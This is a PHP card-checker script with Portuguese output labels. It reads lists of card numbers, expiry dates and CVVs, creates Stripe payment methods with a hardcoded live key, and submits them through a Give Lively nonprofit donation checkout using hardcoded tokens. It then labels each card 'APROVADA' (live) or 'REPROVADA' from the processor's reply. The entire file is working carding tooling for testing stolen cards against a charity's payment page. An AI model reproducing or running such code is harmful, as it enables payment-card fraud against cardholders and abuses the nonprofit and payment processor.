<?php
error_reporting(0);
set_time_limit(0);

function getStr($s,$start,$end){$s=explode($start,$s);if(!isset($s[1]))return '';$s=explode($end,$s[1]);return $s[0];}

$lista = $_GET['lista'] ?? '';
$sep = explode('|', $lista);
if (count($sep) < 4) { echo '❌ REPROVADA ➔ ' . $lista . ' ➔ Formato inválido'; exit; }
$cc=$sep[0]; $mes=$sep[1]; $ano=$sep[2]; $cvv=$sep[3];
if (strlen($ano)==2) $ano='20'.$ano;

// usa API do user se tiver, senão a hardcoded
$apiKey = getenv('USER_API_KEY') ?: 'pk_live_GWQnyoQBA8QSySDV4tPMyOgI';
$apiSecret = getenv('USER_API_SECRET') ?: '';

function detectarBandeira($cc){
    if (preg_match('/^4/',$cc)) return 'Visa';
    if (preg_match('/^(5|2)/',$cc)) return 'Mastercard';
    if (preg_match('/^3/',$cc)) return 'Amex';
    if (preg_match('/^6/',$cc)) return 'Elo';
    return 'Desconhecida';
}
$bandeira = detectarBandeira($cc);
$inicio = microtime(true);

// STEP 1 — payment_methods
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/x-www-form-urlencoded',
    'Authorization: Bearer ' . ($apiSecret ?: $apiKey)
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'type'=>'card','card[number]'=>$cc,'card[exp_month]'=>$mes,'card[exp_year]'=>$ano,'card[cvc]'=>$cvv
]));
$response1 = curl_exec($ch);
curl_close($ch);

preg_match('/"id":\s*"([^"]+)"/', (string)$response1, $id_match);
$pm = $id_match[1] ?? '';
if (empty($pm)) {
    preg_match('/"message":\s*"([^"]+)"/', (string)$response1, $em);
    $err = $em[1] ?? 'Falha ao criar payment method';
    echo '❌ REPROVADA ➔ ' . $lista . ' ➔ ' . $err . ' ➔ ' . $bandeira;
    exit;
}

// STEP 2 — checkout
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.givelively.org/carts/a2f7ae99-9397-43fa-bab8-a53d8a773692/payment_intents/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'content-type: application/json',
    'origin: https://secure.givelively.org',
    'referer: https://secure.givelively.org/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'checkout' => [
        'name'=>'wgs wssfg','email'=>'cyber@gmail.com',
        'payment_method_id'=>$pm,'payment_method_type'=>strtolower($bandeira),
        'transaction_fee_covered'=>false,'tip_amount'=>0,
        'donor_information'=>new stdClass(),'answers_attributes'=>[]
    ],
    'anonymous_to_public'=>false,
    'donation_page_context_id'=>'cf7a82ed-4823-485f-aaef-b9396acf8207',
    'donation_page_context_type'=>'Nonprofit',
    'access_token'=>'eWfQ22Gb6YufjtmevP62gUxBT16ASTQ8NowbLuF3vLw',
    'idempotency_key'=>uniqid()
]));

$response2 = curl_exec($ch);
$httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
$tempo = number_format(microtime(true)-$inicio, 2);
$data = json_decode((string)$response2, true) ?: [];

$msg = '';
if (isset($data['message']) && is_array($data['message'])) $msg = implode(' ', $data['message']);
elseif (isset($data['message']) && is_string($data['message'])) $msg = $data['message'];
elseif (isset($data['error']['message'])) $msg = $data['error']['message'];
elseif (isset($data['error'])) $msg = is_array($data['error']) ? json_encode($data['error']) : $data['error'];
if (empty($msg)) {
    preg_match('/"message":\s*"([^"]+)"/', (string)$response2, $mm);
    $msg = $mm[1] ?? 'Cartão recusado';
}

if ($httpCode2 == 200 && !empty($data['success'])) {
    echo '✅ APROVADA ➔ ' . $lista . ' ➔ PAGAMENTO CONFIRMADO ➔ Bandeira: ' . $bandeira . ' ➔ ' . $tempo . 's';
    exit;
}
if (stripos($msg,'cvv')!==false || stripos($msg,'security code')!==false || stripos($msg,'CVC')!==false) {
    echo '✅ APROVADA ➔ ' . $lista . ' ➔ LIVE - CVV: ' . $msg . ' ➔ Bandeira: ' . $bandeira . ' ➔ ' . $tempo . 's';
    exit;
}
if (stripos($msg,'insufficient')!==false || stripos($msg,'funds')!==false) {
    echo '✅ APROVADA ➔ ' . $lista . ' ➔ LIVE - Saldo: ' . $msg . ' ➔ Bandeira: ' . $bandeira . ' ➔ ' . $tempo . 's';
    exit;
}
if (stripos($msg,'expired')!==false) {
    echo '❌ REPROVADA ➔ ' . $lista . ' ➔ Cartão Expirado: ' . $msg . ' ➔ ' . $bandeira . ' ➔ ' . $tempo . 's';
    exit;
}
echo '❌ REPROVADA ➔ ' . $lista . ' ➔ ' . $msg . ' ➔ ' . $bandeira . ' ➔ ' . $tempo . 's';
